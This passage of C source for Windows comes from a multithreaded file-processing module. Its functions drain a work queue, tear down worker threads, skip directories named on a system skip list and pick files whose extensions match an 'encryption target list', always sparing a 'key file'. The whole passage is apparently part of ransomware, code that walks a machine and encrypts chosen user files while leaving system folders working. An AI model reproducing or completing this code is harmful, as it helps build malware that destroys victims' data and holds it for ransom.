    while (ctx->queueCount > 0 || ctx->activeWorkers > 0) {
        SleepConditionVariableCS(&ctx->queueIdle, &ctx->queueLock, INFINITE);
    }
    LeaveCriticalSection(&ctx->queueLock);
}

// FileOps_GetStats copies the current statistics out to the caller supplied struct
void FileOps_GetStats(FILEOPS_CTX* ctx, FILEOPS_STATS* outStats) {
    if (!ctx || !outStats) return;
    EnterCriticalSection(&ctx->statsLock);
    *outStats = ctx->stats; // atomic copy under lock
    LeaveCriticalSection(&ctx->statsLock);
}

// FileOps_DestroyContext shuts down workers, drains the queue, and frees all memory
void FileOps_DestroyContext(FILEOPS_CTX* ctx) {
    if (!ctx) return;
    // signal all workers to stop as soon as the queue drains
    EnterCriticalSection(&ctx->queueLock);
    InterlockedExchange(&ctx->shutdownFlag, 1); // atomically set the flag
    WakeAllConditionVariable(&ctx->queueNotEmpty); // wake all sleeping workers
    LeaveCriticalSection(&ctx->queueLock);

    // wait for every worker thread to finish and then close its handle
    for (DWORD i = 0; i < ctx->threadCount; i++) {
        if (ctx->threads[i]) {
            WaitForSingleObject(ctx->threads[i], INFINITE); // block until done
            CloseHandle(ctx->threads[i]);
        }
    }

    // free any items that were still in the queue when shutdown was called
    struct WorkItem *item = ctx->queueHead;
    while (item) {
        struct WorkItem *next = item->next;
        HeapFree(GetProcessHeap(), 0, item);
        item = next;
    }

    // release thread handle array and synchronisation objects
    HeapFree(GetProcessHeap(), 0, ctx->threads);
    DeleteCriticalSection(&ctx->statsLock);
    DeleteCriticalSection(&ctx->queueLock);
    // free the context itself last
    HeapFree(GetProcessHeap(), 0, ctx);
}

// FileOps_DefaultShouldSkip returns true if a directory path is in the system skip list
// this is the default pfnShouldSkip callback for callers that do not provide their own
bool FileOps_DefaultShouldSkip(const WCHAR* path) {
    // convert the wide path to narrow for string comparison
    char narrow[FILEOPS_MAX_PATH];
    if (!WideCharToMultiByte(CP_UTF8, 0, path, -1, narrow, sizeof(narrow), NULL, NULL))
        return false; // if conversion fails do not skip
    // check the path against every entry in the global skip list
    for (int i = 0; g_skip[i]; i++) {
        if (strstr(narrow, g_skip[i])) return true; // found a match so skip this dir
    }
    return false; // no match so do not skip
}

// IsTargetExtension returns true if the file extension is in the encryption target list
// also returns false for the key file regardless of extension
static bool IsTargetExtension(const char* path) {
    if (!path) return false; // null path is never a target

    // never encrypt the key file no matter where it lives
    if (IsKeyFilePath(path)) return false;

    // find the last dot in the path to isolate the extension
    const char *dot = strrchr(path, '.');
    if (!dot) return false; // no extension means not a target

    // compare the extension case insensitively against every entry in the list
    for (int i = 0; g_ext[i]; i++) {
        if (_stricmp(dot, g_ext[i]) == 0) return true; // found a matching extension
    }
    return false; // extension not in the target list
}
